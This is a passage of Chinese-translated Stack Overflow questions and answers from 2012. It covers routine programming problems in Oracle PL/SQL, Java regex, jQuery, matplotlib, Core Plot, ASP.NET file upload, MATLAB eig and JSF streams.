       a.LOCAL_ACCOUNT_NAME,
       c.GLOBAL_ACCOUNT_TYPE  t_conto,
       ltrim(rtrim(a.GLOBAL_ACCOUNT_CODE))||ltrim(rtrim(a.LOCAL_ACCOUNT_CODE)) GLOBAL_LOCAL
 FROM  V_LOCAL_ACCOUNTS@GDW_LIVE  a,V_GLOBAL_ACCOUNTS@GDW_LIVE  c --V_LOCAL_ACCOUNTS@GDWPP_ANY  a,V_GLOBAL_ACCOUNTS@GDWPP_ANY  c
 WHERE a.enabled_flag = 'Y'
 AND a.GLOBAL_ACCOUNT_CODE=c.GLOBAL_ACCOUNT_CODE
 AND not exists (SELECT 1
                 FROM conto_gdw b   -- considero solo i conti nuovi
                 WHERE a.LOCAL_ACCOUNT_CODE = b.c_conto_local_gdw
                AND   a.GLOBAL_ACCOUNT_CODE=b.C_CONTO_GLOBAL_GDW); 
```

但是在插入时代码失败....

```
INSERT INTO conto_gdw
                    (C_CONTO_LOCAL_GDW,
                     S_CONTO_LOCAL_GDW,
                     C_CONTO_GLOBAL_GDW,
                     T_CONTO,
                     D_INIZIO,
                     GLOBAL_LOCAL)
             VALUES (Rec_Crs_c1.LOCAL_ACCOUNT_CODE,
                     nvl(Rec_Crs_c1.LOCAL_ACCOUNT_NAME,'.'),
                     Rec_Crs_c1.GLOBAL_ACCOUNT_CODE,
                     Rec_Crs_c1.t_conto,
                     (v_anno_in * 100) + v_mese_in,
                     Rec_Crs_c1.GLOBAL_LOCAL); 
```

可能是由于单个元组（数据集）而发生此问题。我怎样才能找到罪魁祸首数据？我已经通过将光标选择的所有数据放入excel表中检查了它，但我无法手动找到任何东西。ORACLE 有没有办法将失败的数据返回给我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:00:20.843

您需要在插入数据时进行适当的异常处理。提供 pl sql 块的输出。之后我们可以帮助您。

```
DECLARE
   CURSOR Crs_c1
   IS
      SELECT   a.GLOBAL_ACCOUNT_CODE,
               a.LOCAL_ACCOUNT_CODE,
               a.LOCAL_ACCOUNT_NAME,
               c.GLOBAL_ACCOUNT_TYPE t_conto,
               LTRIM (RTRIM (a.GLOBAL_ACCOUNT_CODE))
               || LTRIM (RTRIM (a.LOCAL_ACCOUNT_CODE))
                  GLOBAL_LOCAL
        FROM   V_LOCAL_ACCOUNTS@GDW_LIVE a, V_GLOBAL_ACCOUNTS@GDW_LIVE c 
       WHERE   a.enabled_flag = 'Y'
               AND a.GLOBAL_ACCOUNT_CODE = c.GLOBAL_ACCOUNT_CODE
               AND NOT EXISTS
                     (SELECT   1
                        FROM   conto_gdw b     -- considero solo i conti nuovi
                       WHERE   a.LOCAL_ACCOUNT_CODE = b.c_conto_local_gdw
                               AND a.GLOBAL_ACCOUNT_CODE =
                                     b.C_CONTO_GLOBAL_GDW);

Rec_Crs_c1 Crs_c1%ROWTYPE;
BEGIN
   OPEN Crs_c1;

   LOOP
      FETCH Crs_c1 INTO   Rec_Crs_c1;

      EXIT WHEN Crs_c1%NOTFOUND;

      INSERT INTO conto_gdw (C_CONTO_LOCAL_GDW,
                             S_CONTO_LOCAL_GDW,
                             C_CONTO_GLOBAL_GDW,
                             T_CONTO,
                             D_INIZIO,
                             GLOBAL_LOCAL)
        VALUES   (Rec_Crs_c1.LOCAL_ACCOUNT_CODE,
                  NVL (Rec_Crs_c1.LOCAL_ACCOUNT_NAME, '.'),
                  Rec_Crs_c1.GLOBAL_ACCOUNT_CODE,
                  Rec_Crs_c1.t_conto,
                  (v_anno_in * 100) + v_mese_in,
                  Rec_Crs_c1.GLOBAL_LOCAL);
   END LOOP;

   CLOSE Crs_c1;
EXCEPTION
   WHEN OTHERS
   THEN
      DBMS_OUTPUT.put_line ('Error Message' || SQLERRM);
      DBMS_OUTPUT.put_line(   'GLOBAL_ACCOUNT_CODE :'
                           || Rec_Crs_c1.LOCAL_ACCOUNT_CODE
                           || 'LOCAL_ACCOUNT_CODE '
                           || Rec_Crs_c1.LOCAL_ACCOUNT_NAME
                           || 'GLOBAL_ACCOUNT_CODE :'
                           || Rec_Crs_c1.GLOBAL_ACCOUNT_CODE
                           || 'GLOBAL_ACCOUNT_TYPE '
                           || Rec_Crs_c1.t_conto
                           || 'GLOBAL_LOCAL'
                           || Rec_Crs_c1.GLOBAL_LOCAL);
END; 
```

# java - 正则表达式，匹配没有“http://”和任何其他“/”的url

> ID：13704362
> 
> 赞同：3
> 
> 时间：2012-12-04T13:45:32.677
> 
> 标签：java, regex, url, expression

我环顾了一会儿，但可能我无法使用正确的关键字“谷歌”......所以我在这里。我需要将一个 url 剥离协议匹配到 first /

**目标：**将http://的第一个子字符串匹配到第一个/（可能最后一个/不存在）或到最后一个问题来了：

我写了这个正则表达式

> (?<=//)(.*?)(?=/)

但是这个正则表达式只匹配最后至少有 1 个“/”的 url，不包括协议..

这里有一些要匹配的网址：

*   http://www.google.com/ （由我的正则**表达式**匹配）
*   http://www.google.com **_**
*   https://www.google **_**
*   xxx:// **www.google.com** /hello/bleh blah....../
*   xxx: **//google.com**
*   **google.com** /blah/hello.php?x=11_x.hi

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:56:35.067

就像是...

```
^(https?:\/\/)?([0-9a-zA-Z][-\w]*[0-9a-zA-Z\.)+[a-zA-Z]{2,6})\/ 
```

我在我的一本书中看到了这一点。这应该解释变量 http/https，不允许空格，并且可能在第一个斜杠处停止。

如果我做错了，请发表评论。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:53:49.663

```
^(?:\w+://)?([\w.-]+)/?.*$ 
```

（Java 的双反斜杠）似乎适用于您的所有示例，包括一个简单的`www.google.com`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:57:13.137

这适用于您的所有示例，但最后一个：

```
(?<=//)[^/\\s]+ 
```

`[^/\\s]`是一个否定字符类，匹配除`/`and之外的所有字符`\s`（空格，例如空格、制表符或换行符）

[在 Regexr 上](http://regexr.com?331j3)查看

**最后一行是行不通的。你想如何决定什么是链接？如果我将第一部分设为可选，它将匹配除`/`空格以外的每个字符。**

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T01:51:29.760

看起来你有正确的答案，但你错过了没有尾随“/”的可能性。尝试这个：

```
(?<=//)(.*?)(?=/|$) 
```

# javascript - 使用 JavaScript 注入 HTML

> ID：13704369
> 
> 赞同：0
> 
> 时间：2012-12-04T13:46:09.697
> 
> 标签：javascript, asp.net-mvc-3, html

我认为：

```
 <div class="grid_12">
<div class="box tabbed news" id="box1">
   <div class="header">
    <h3>
       <%: Model.News.Title %> 
    </h3>
  </div>
  <div class="content" id="newsItem">
    <% Html.RenderPartial("NewsItem", Model); %>
  </div> 
  <div class="clear"></div>
 </div>
 </div> <!-- End of .grid_12 -->

 <div class="clear"></div>
 <table id="table2">

 </table>
 <div class="grid_12">
 <div class="box tabbed news" id="box2">
   <div class="content" id="testdiv">
     <table id="table">
       <tr>
         <td>
           <a href="javascript:ShowReplyTextArea();" class="button">Reply</a>
         </td>
         <td>
           <a href="javascript:ReplyPost(<%: Model.News.NewsId %>);" class="button" id="post_button">Post</a>
         </td>
       </tr>
     </table>
    </div>
  </div>
</div>
<div class="clear"></div>
</asp:Content>

<asp:Content ID="Content5" ContentPlaceHolderID="ScriptPlaceHolder" runat="server">
<script type="text/javascript">
 function ShowReplyTextArea() {
   div = document.getElementById('testdiv')
   textArea = document.createElement("textarea");
   textArea.setAttribute('rows', 20);
   textArea.setAttribute('cols', 149);
   textArea.setAttribute('id', "textarea");

   div.appendChild(textArea);
 }

 function ReplyPost(newsId) {
   var message = $("#textarea").text();
   if (message != null)
     $("#post_button").show();
   var jqxhr = $.getJSON("<%= Url.Action("ReplyPost", "Home", new { area = "News" }) %>?newsId=" + newsId + "&message=" + message, function (data) {
   });

   divtext = document.getElementById('table2');
   divtext.setAttribute('text', message);
 }
</script> 
```

当我点击回复按钮时，我的文本区域会弹出，我输入了一些新闻，然后点击发布按钮。我需要显示我刚刚在 grid_12 div 下键入的内容。然后必须再次隐藏文本区域，直到我再次单击回复

我正在努力完成这项工作。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:58:08.520

添加一些 div 来显示值并在 MVC3 中使用 jQuery，您可以开箱即用地使用 jQuery。当您使用 $("#id") 时，您可以按 id 选择项目，这与 getElementById 非常相似，但它是一组 jQuery 包装，您可以使用它来做比正常选择更多的事情。

用于显示的新 div

```
<div id="displayArea"></div> 
```

一些 jQuery 代码放在 onClick 中：

```
$("#textArea").hide();
$("#displayArea").innerText = $("#textArea").val(); 
```

# jquery - 取消选中其他框时取消选中

> ID：13704371
> 
> 赞同：1
> 
> 时间：2012-12-04T13:46:10.070
> 
> 标签：jquery, checkbox

我有 2 个主要复选框“ja”和“nee”。当检查其中一个复选框时，它会打开一个具有1个或更多复选框的子菜单。这些子复选框也是“ja”和“nee”，并响应主复选框中的选择。我遇到的问题是用户可以在主复选框中选择“nee”，然后将所有子复选框更改为“ja”，但是主复选框保持在“nee”，但它必须切换到“ja”复选框。

我已经做到了，所以问题只有 2 个复选框，并且只有它们可以有一个选中的属性，并且子复选框位于一个名为“子菜单”的 div 类中。

我认为解决这个问题的方法是检查子菜单中是否选中了任何“nee”类子复选框。如果它是主复选框，则保留在“nee”，否则从“nee”主复选框中删除选中的属性并将其切换到“ja”复选框。但显然我无法弄清楚如何做到这一点。

我做了一个小的 jsFiddle 来展示这个项目：http: [//jsfiddle.net/B2zs5/](http://jsfiddle.net/B2zs5/)

```
<div>
<p>Heb je DigiD?</p>
                <div class="antwoorden">
                    <input id="ja" type="checkbox" value="ja" class="sub_antwoord ja"/><label for="ja">Ja</label>
                    <input id="nee" type="checkbox" value="nee" class="sub_antwoord nee"/><label for="nee">Nee</label> 
                    <div class="extra_info">?
                        <div class="extra_info_popup">
                            Hidden tekst
                        </div>
                    </div>
                </div>
            </div> 
```

这是jQuery代码

```
 $('.open_sub_ja').click(function () {
    $(this).parents('.container_vragen').find('.ja').attr('checked', this.checked);
    $(this).parents('.container_vragen').find('.nee').removeAttr('checked');
});

$('.open_sub_nee').click(function () {
    $(this).parents('.container_vragen').find('.ja').removeAttr('checked');
    $(this).parents('.container_vragen').find('.nee').attr('checked', this.checked);
});

    $('.ja').click(function () {
        $(this).parents('.antwoorden').find('.ja').attr('checked', this.checked);
        $(this).parents('.antwoorden').find('.nee').removeAttr('checked');
    });

    $('.nee').click(function () {
        $(this).parents('.antwoorden').find('.ja').removeAttr('checked');
        $(this).parents('.antwoorden').find('.nee').attr('checked', this.checked);
    }); 
```

如果我猜它会是这样的，

```
 if('.nee'.attr('checked')) {
    // do nothing
} 
else {
    $('.open_sub_nee').removeAttr('checked');
    $('.open_sub_ja').attr('checked');
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:18:09.897

我猜你想要主 nee > 所有 sub 的 ja > 将 main 设置为 ja，反之亦然，当 1 个或多个 sub 是 nee 时，将 main ja 更改为 nee。

第二点很简单：

```
$('.nee').click(function () {
    $(this).parents('.antwoorden').find('.ja').removeAttr('checked');
    $(this).parents('.antwoorden').find('.nee').attr('checked', this.checked);

    $(this).parents('.container_vragen').find('.open_sub_ja').removeAttr('checked');
    $(this).parents('.container_vragen').find('.open_sub_nee').attr('checked', this.checked);
}); 
```

它似乎已将我的编辑保存在[http://jsfiddle.net/B2zs5/2/](http://jsfiddle.net/B2zs5/2/)

子菜单中的所有复选框都更改为 ja 将主 nee 更改为 ja：http: [//jsfiddle.net/B2zs5/5/](http://jsfiddle.net/B2zs5/5/) - 我使用了 Teun 的代码并[确定是否选中了 jQuery 对象中的所有复选框，返回为布尔值](https://stackoverflow.com/questions/3719851/determine-if-all-checkboxes-within-jquery-object-are-checked-return-as-boolean)

```
$('.ja').click(function () {
    $(this).parents('.antwoorden').find('.ja').attr('checked', this.checked);
    $(this).parents('.antwoorden').find('.nee').removeAttr('checked');

    $group1 = $(this).parents('.submenu').find('.ja');
    if( $group1.filter(':not(:checked)').length === 0){
        //ALL ja checkboxes in submenu checked
        $(this).parents('.container_vragen').find('.open_sub_ja').attr('checked', this.checked);
        $(this).parents('.container_vragen').find('.open_sub_nee').removeAttr('checked');
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:13:25.640

编辑了你的小提琴，添加了一个检查。这将禁用对取消检查的检查，可以在这里找到添加/3/在你自己的链接后面。不让我发布它：/这是您要找的东西吗？这样，它会删除所有检查，虽然你比我更了解你的课程，但现在基础知识已经有了..

# python - 如何使用 imshow() 限制 x 轴的范围？

> ID：13704373
> 
> 赞同：4
> 
> 时间：2012-12-04T13:46:14.090
> 
> 标签：python, matplotlib

我有以下数据

```
1.105   0.919   0.842   0.715   0.704   0.752   0.827   1.049   0.584   
0.998   0.931   0.816   0.787   0.803   0.856   0.782   0.872   0.710   
1.268   1.189   1.036   0.984   0.847   0.948   1.083   0.864   0.792 
```

我与`imshow()`

结果如下所示： ![在此处输入图像描述](../Images/247ad4d0e364d11250aa072e52de8912.png)

这是我的代码：

```
from numpy import*
import matplotlib.cm as cm
import matplotlib.mlab as mlab
import matplotlib.pyplot as plt
from mpl_toolkits.axes_grid1 import make_axes_locatable

shape=(3,9)
velocity=zeros(shape)

fig = plt.figure(figsize=(16, 12), dpi=100)
ax1 = fig.add_subplot(111,aspect='equal')
#   ax1.set_yticks([int(100*j) for j in range(0,4)])
ax1.set_yticks([int(j) for j in range(0,4)])
ax1.set_xticks([int(j) for j in range(-4,5)])
for label in ax1.get_xticklabels() + ax1.get_yticklabels():
    label.set_fontsize(15)
for tick in ax1.get_xticklines() + ax1.get_yticklines():
    tick.set_markeredgewidth(2)
    tick.set_markersize(6)
ax1.set_aspect("equal") 
velocity=loadtxt("fieldvelocitybot-300-100-100_400.dat")

im = plt.imshow(velocity, cmap=cm.jet, interpolation='nearest',origin='lower',vmin=0,vmax=1.7, extent=[-4.50,4.50,0.,3.00])

divider = make_axes_locatable(ax1)
cax = divider.append_axes("right", size="2.5%", pad=0.3)
cb=plt.colorbar(im,cax=cax)
cb.set_label('Speed [$m/s$]')
plt.savefig("speed_400.png")
plt.close(fig) 
```

我的问题是：如何只显示从-4 到 4 的结果？直觉上我想到了改变`extent=[-4.00,4.00,0.,3.00]`，但是轴只是移动了。结果是这样的： ![在此处输入图像描述](../Images/37c96c2440e610577d3b23eb5fea9b80.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T14:07:20.147

设置 imshow 的范围很好，因为这定义了数据的范围。它没有指定显示的范围，因为这是轴的属性，可以通过简单地添加 ax1.set_xlim(-4,4) 来设置

所以：

```
from mpl_toolkits.axes_grid1 import make_axes_locatable
import numpy as np
import matplotlib.pyplot as plt

velocity=np.random.rand(3,9)

fig, ax1 = plt.subplots(1,1,figsize=(16, 12), dpi=100, subplot_kw={'aspect': 'equal'})

ax1.set_yticks([int(j) for j in range(0,4)])
ax1.set_xticks([int(j) for j in range(-4,5)])

for label in ax1.get_xticklabels() + ax1.get_yticklabels():
    label.set_fontsize(15)
for tick in ax1.get_xticklines() + ax1.get_yticklines():
    tick.set_markeredgewidth(2)
    tick.set_markersize(6)

im = ax1.imshow(velocity, cmap=cm.jet,     interpolation='nearest',origin='lower',vmin=0,vmax=1.7, extent=[-4.50,4.50,0,3])
ax1.set_xlim(-4,4)

divider = make_axes_locatable(ax1)
cax = divider.append_axes("right", size="2.5%", pad=0.3)
cb=plt.colorbar(im,cax=cax)
cb.set_label('Speed [$m/s$]')

plt.savefig("speed_400.png")
plt.close(fig) 
```

![在此处输入图像描述](../Images/2cfb46eb76d1b22c786cdab81127eecd.png)

# ios - 条仅出现在第一个索引处

> ID：13704375
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:46:19.927
> 
> 标签：ios, indexing, core-plot, cptbarplot

我的条形图上的条形图并未散布在整个图表中，而是仅限于第一个索引！ ![在此处输入图像描述](../Images/d200ccacde1b81f661b5809a1f4fac5b.png)

```
- (UIView*)pagingScrollView:(BAGPagingScrollView*)pagingScrollView
       viewForPageIndex:(int)index;

{
NSLog(@"THE INDEX COMING THROUGH INTO THE PAGING SCROLL VIEW = %i",index);
      _index = index;

_graphBase = [[CPTGraphHostingView alloc]initWithFrame:_pagingView.frame];
[self updateGraph:_graphBase forIndex:_index]; 
```

}

```
-(void) updateGraph:(CPTGraphHostingView*)graph forIndex:(int) index
{
....
else if (index == 5){

    graph.allowPinchScaling = NO;
    _averageOfPar = [[NSArray alloc]initWithArray:[self getParForPlayerName]];
    _averageDataValuesMultiple = [[NSArray alloc]initWithArray:[self arrayOfAverageDataValuesFromTheUserMultiple]];
    NSLog(@"average data values %@", _averageDataValuesMultiple);
    NSLog(@"average of par = %@",_averageOfPar);
    [self barChartconfigureGraph:graph];
    [self barChartconfigurePlots:graph];
    [self barChartconfigureAxes:graph]; 

} 
```

....}

```
 -(void)barChartconfigureGraph:(CPTGraphHostingView*)hostView {

CPTGraph *graph = [[CPTXYGraph alloc] initWithFrame:hostView.bounds];
graph.plotAreaFrame.masksToBorder = NO;
hostView.hostedGraph = graph;

// 2 - Configure the graph

[graph applyTheme:[CPTTheme themeNamed:kCPTDarkGradientTheme]];
graph.plotAreaFrame.fill = [CPTFill fillWithColor:[CPTColor clearColor]];
graph.paddingBottom = 30.0f;
graph.paddingLeft  = 30.0f;
graph.paddingTop    = 0.0f;
graph.paddingRight  = 0.0f;

// 3 - Set up styles

CPTMutableTextStyle *titleStyle = [CPTMutableTextStyle textStyle];
titleStyle.color = [CPTColor whiteColor];
titleStyle.fontName = @"Helvetica-Bold";
titleStyle.fontSize = 16.0f;

// 4 - Set up title

NSString *title = @"Average Shot Compared To Par";
graph.title = title;
graph.titleTextStyle = titleStyle;
graph.titlePlotAreaFrameAnchor = CPTRectAnchorTop;
graph.titleDisplacement = CGPointMake(0.0f, -16.0f);
// 5 - Set up plot space
CGFloat xMin = 0.0f;
CGFloat xMax = (([_averageOfPar count])+0.2);
CGFloat yMin = 0.0f;
CGFloat yMax = ([self largestShotMade]);

CPTXYPlotSpace *plotSpace = (CPTXYPlotSpace *) graph.defaultPlotSpace;
plotSpace.xRange = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(xMin) length:CPTDecimalFromFloat(xMax)];
plotSpace.yRange = [CPTPlotRange plotRangeWithLocation:CPTDecimalFromFloat(yMin) length:CPTDecimalFromFloat(yMax)];

  } 
```

-(void)barChartconfigurePlots:(CPTGraphHostingView*)hostView{

```
// 1 - Set up the three plots

_personsShotPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor blueColor] horizontalBars:NO];
_personsShotPlot.identifier = _nameComingThrough;
_parPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor whiteColor] horizontalBars:NO];
_parPlot.identifier = PAR;

// 2 - Set up line style

CPTMutableLineStyle *barLineStyle = [[CPTMutableLineStyle alloc] init];
barLineStyle.lineColor = [CPTColor lightGrayColor];
barLineStyle.lineWidth = 0.5;

// 3 - Add plots to graph

CPTGraph *graph = hostView.hostedGraph;
CGFloat barX = CPDBarInitialXSecondForSplotMultiple;
NSArray *plots = [NSArray arrayWithObjects: self.parPlot,self.personsShotPlot, nil];

//NSLog(@"about to enter the plot for loop");

for (CPTBarPlot *plot in plots) {
    plot.dataSource = self;
   plot.delegate = self;
    plot.barWidth = CPTDecimalFromDouble(CPDBarInitialXSecondForSplotMultiple/* + [self widthNumToAdd]*/);
    plot.barOffset = CPTDecimalFromDouble(barX);
    plot.lineStyle = barLineStyle;
    [graph addPlot:plot toPlotSpace:graph.defaultPlotSpace];
    barX += CPDBarInitialXSecondForSplotMultiple/*+ [self widthNumToAdd]*/;
}
//[graph reloadDataIfNeeded]; 
```

} -(void)barChartconfigurePlots:(CPTGraphHostingView*)hostView{

```
// 1 - Set up the three plots

_personsShotPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor blueColor] horizontalBars:NO];
_personsShotPlot.identifier = _nameComingThrough;
_parPlot = [CPTBarPlot tubularBarPlotWithColor:[CPTColor whiteColor] horizontalBars:NO];
_parPlot.identifier = PAR;

// 2 - Set up line style

CPTMutableLineStyle *barLineStyle = [[CPTMutableLineStyle alloc] init];
barLineStyle.lineColor = [CPTColor lightGrayColor];
barLineStyle.lineWidth = 0.5;

// 3 - Add plots to graph

CPTGraph *graph = hostView.hostedGraph;
CGFloat barX = CPDBarInitialXSecondForSplotMultiple;
NSArray *plots = [NSArray arrayWithObjects: self.parPlot,self.personsShotPlot, nil];

//NSLog(@"about to enter the plot for loop");

for (CPTBarPlot *plot in plots) {
    plot.dataSource = self;
   plot.delegate = self;
    plot.barWidth = CPTDecimalFromDouble(CPDBarInitialXSecondForSplotMultiple/* + [self widthNumToAdd]*/);
    plot.barOffset = CPTDecimalFromDouble(barX);
    plot.lineStyle = barLineStyle;
    [graph addPlot:plot toPlotSpace:graph.defaultPlotSpace];
    barX += CPDBarInitialXSecondForSplotMultiple/*+ [self widthNumToAdd]*/;
}
//[graph reloadDataIfNeeded]; 
```

}

-(void)barChartconfigureAxes:(CPTGraphHostingView*)hostView {

```
// 1 - Configure styles

CPTMutableTextStyle *axisTitleStyle = [CPTMutableTextStyle textStyle];
axisTitleStyle.color = [CPTColor whiteColor];
axisTitleStyle.fontName = @"Helvetica-Bold";
axisTitleStyle.fontSize = 12.0f;
CPTMutableLineStyle *axisLineStyle = [CPTMutableLineStyle lineStyle];
axisLineStyle.lineWidth = 2.0f;
axisLineStyle.lineColor = [[CPTColor whiteColor] colorWithAlphaComponent:1];

// 2 - Get the graph's axis set

CPTXYAxisSet *axisSet = (CPTXYAxisSet *) hostView.hostedGraph.axisSet;

// 3 - Configure the x-axis

axisSet.xAxis.labelingPolicy = CPTAxisLabelingPolicyNone;
axisSet.xAxis.title = @"Hole Number";
axisSet.xAxis.titleTextStyle = axisTitleStyle;
axisSet.xAxis.titleOffset = 15.0f;
axisSet.xAxis.axisLineStyle = axisLineStyle;

CPTAxis *x = axisSet.xAxis;

NSMutableSet *xLabels = [NSMutableSet setWithCapacity:[_averageDataValues count]];
NSMutableSet *xLocations = [NSMutableSet setWithCapacity:[_averageDataValues count]];
NSInteger i = 0;

for (NSString *holeName in [self holeNames]) {

    CPTAxisLabel *label = [[CPTAxisLabel alloc] initWithText:holeName  textStyle:x.labelTextStyle];
    CGFloat location = i++;
    label.tickLocation = CPTDecimalFromCGFloat(location + .4);
    label.offset =-1;
    if (label) {
        [xLabels addObject:label];

        [xLocations addObject:[NSNumber numberWithFloat:location + .4]];
    }
}

x.axisLabels = xLabels;
x.majorTickLocations = xLocations;

// 4 - Configure the y-axis
axisSet.yAxis.labelingPolicy = CPTAxisLabelingPolicyNone;
axisSet.yAxis.title = @"Number Of Shots";
axisSet.yAxis.titleTextStyle = axisTitleStyle;
axisSet.yAxis.titleOffset = 5.0f;
axisSet.yAxis.axisLineStyle = axisLineStyle;

[hostView.hostedGraph reloadDataIfNeeded]; 
```

}

```
 -(NSUInteger)numberOfRecordsForPlot:(CPTPlot *)plot {
  else if (_index == 5) return 18;//[_averageDataValuesMultiple count];

}

  -(NSNumber *)numberForPlot:(CPTPlot *)plot field:(NSUInteger)fieldEnum recordIndex:(NSUInteger)index {

else if (_index == 5) {

    if (fieldEnum == CPTBarPlotFieldBarTip) {
    if ([plot.identifier isEqual:_nameComingThrough]) {

    return [_averageDataValuesMultiple objectAtIndex:index];
        //return [NSNumber numberWithInt:5];

    } else if ([plot.identifier isEqual:PAR]) {

        return [_averageOfPar objectAtIndex:index];
        //return [NSNumber numberWithInt:2];

    }
}
} 
```

本来不想贴代码的，因为有点复杂，希望是以前见过的bug！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T01:15:43.853

确保您的数据源提供`CPTBarPlotFieldBarLocation`除`CPTBarPlotFieldBarTip`. 看起来您为每个条形索引返回相同的位置值，这将条形放在彼此之上。

# c# - Asp.net 文件上传问题

> ID：13704380
> 
> 赞同：0
> 
> 时间：2012-12-04T13:46:38.693
> 
> 标签：c#, asp.net

我们公司在我们的网站上设置了一个用于奖学金申请的表格，我在上传文件时遇到了问题。我在 C# 中使用 asp.net 页面来处理表单数据。

从表格：

```
<form id="scholarForm" name="scholarForm" enctype="multipart/form-data" method="post" runat="server" action="upload_form.aspx">

<input id="transcript" type="file" /> 
```

处理数据的 asp.net 页面（为相关性而编辑的代码）：

```
protected HttpPostedFile transcript;

transcript = Request.Files["transcript"];

transcript.SaveAs(@"c:\Dollars Applicants\" + fullName + "_" + memberNumber + @"\" + transcript.FileName); 
```

这只会产生一个空引用错误，我不知道为什么。我尝试上传几种不同的文件类型，但均未成功。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:14:07.513

尝试使用`FileUpload`控件。（文档：http: [//msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.fileupload.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.fileupload.aspx)）

表格代码：

```
<asp:FileUpload runat="server" ID="fuTranscript" /> 
```

后面的代码：

```
if (fuTranscript.HasFile)
{
    fuTranscript.SaveAs(@"c:\Dollars Applicants\" + fullName + "_" + memberNumber + @"\" + fuTranscript.FileName);
} 
```

# matlab - Matlab eig 是否总是返回排序值？

> ID：13704384
> 
> 赞同：14
> 
> 时间：2012-12-04T13:46:49.560
> 
> 标签：matlab, matrix, linear-algebra, eigenvector, eigenvalue

我在 Matlab 中使用了一个函数：

```
[V,D] = eig(C); 
```

我看到 V 和 D 总是按升序排序。它总是这样还是应该在我得到`V`和`D`重视之后对它们进行排序？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-12-04T14:00:56.833

如果你想*保证*排序升序的值，只需做一个额外的

```
if ~issorted(diag(D))
    [V,D] = eig(A);
    [D,I] = sort(diag(D));
    V = V(:, I);
end 
```

以您想要的方式对它们进行排序。

或者，使用`eigs`：

```
[V,D] = eigs(A,size(A,1)-1) 
```

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2012-12-04T13:58:19.690

V 不按任何顺序排序，除了对应于相关特征值的顺序。但也许你不是那个意思。

特征值倾向于按降序排列，但这根本不能保证。它们往往是有序的，因为最大的往往会从顶部的算法中流出。Eig 最终无法确保这一事实。

我可能会指出[eigenshuffle](http://www.mathworks.com/matlabcentral/fileexchange/22885-eigenshuffle)工具，该工具旨在获取一系列特征问题，然后再利用特征值（和相应的特征向量），使它们沿序列保持一致。

如果您确实确实需要它们以降序排列，那么请进行排序以确保这一事实。确保您还以相同的顺序对向量进行排序。

# jsf - 流关闭异常

> ID：13704387
> 
> 赞同：0
> 
> 时间：2012-12-04T13:47:00.677
> 
> 标签：jsf, primefaces, filestream, graphicimage

`Stream is closed Exception`当我要保存上传的图像时，我得到了。我正在尝试`graphicImage`在保存之前预览上传的图像。此操作正在运行。但我无法保存图像。这是我的代码：

```
private InputStream in;
private StreamedContent filePreview;
// getters and setters

public void upload(FileUploadEvent event)throws IOException { 
    // Folder Creation for upload and Download
    File folderForUpload = new File(destination);//for Windows
    folderForUpload.mkdir();
    file = new File(event.getFile().getFileName());
    in = event.getFile().getInputstream();
    filePreview = new DefaultStreamedContent(in,"image/jpeg");
    FacesMessage msg = new FacesMessage("Success! ", event.getFile().getFileName() + " is uploaded.");  
    FacesContext.getCurrentInstance().addMessage(null, msg);
}

public void setFilePreview(StreamedContent fileDownload) {
    this.filePreview = fileDownload;
}

public StreamedContent getFilePreview() {
    return filePreview;
}

public void saveCompanyController()throws IOException{
    OutputStream out  = new FileOutputStream(getFile());
    byte buf[] = new byte[1024];
    int len;
    while ((len = in.read(buf)) > 0)
        out.write(buf, 0, len);
    FileMasterDO fileMasterDO=new FileMasterDO();
    fileMasterDO.setFileName(getFile().getName());
    fileMasterDO.setFilePath(destination +file.getName());
    fileMasterDO.setUserMasterDO(userMasterService.findUserId(UserBean.getUserId()));
    fileMasterDO.setUpdateTimeStamp(new Date());
    in.close();
    out.flush();
    out.close();
    fileMasterService.save(filemaster);
} 
```

bean 在会话范围内。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:55:17.767

您正在尝试读取`InputStream`两次（第一次是在`DefaultStreamedContent`上传方法的构造函数中，第二次是在保存方法的复制循环中）。这是不可能的。它只能读取一次。您需要`byte[]`先将其读入，然后将其分配为 bean 属性，以便您可以将其重用于 the`StreamedContent`和 save。

确保您*从不*持有外部资源，例如`InputStream`或`OutputStream`作为 bean 属性。在适用的情况下从当前和其他 bean 中删除它们，并用于`byte[]`将图像的内容作为属性保存。

在您的特定情况下，您需要按如下方式修复它：

```
private byte[] bytes; // No getter+setter!
private StreamedContent filePreview; // Getter only.

public void upload(FileUploadEvent event) throws IOException {
    InputStream input = event.getFile().getInputStream();

    try {
        IOUtils.read(input, bytes);
    } finally {
        IOUtils.closeQuietly(input);
    }

    filePreview = new DefaultStreamedContent(new ByteArrayInputStream(bytes), "image/jpeg");
    // ...
}

public void saveCompanyController() throws IOException {
    OutputStream output = new FileOutputStream(getFile());

    try {
        IOUtils.write(bytes, output);
    } finally {
        IOUtils.closeQuietly(output);
    }

    // ...
} 
```

注意：`IOUtils`来自 Apache Commons IO，您应该已经在类路径中拥有它，因为它是`<p:fileUpload>`.

# sql-server - 如何从备份中仅生成数据脚本

> ID：13704390
> 
> 赞同：1
> 
> 时间：2012-12-04T13:47:18.937
> 
> 标签：sql-server, sql-server-2008, backup, smo

我一直在尝试只生成用于特定用途的数据脚本，`Tables`但`SMO`没有`backup`成功。

有没有办法这样做？（即使没有`SMO`）

条件：
- 数据脚本生成必须以编程方式完成，因此我可以将表格列表作为参数。
- 数据脚本生成必须尊重表依赖性（FK 约束）。

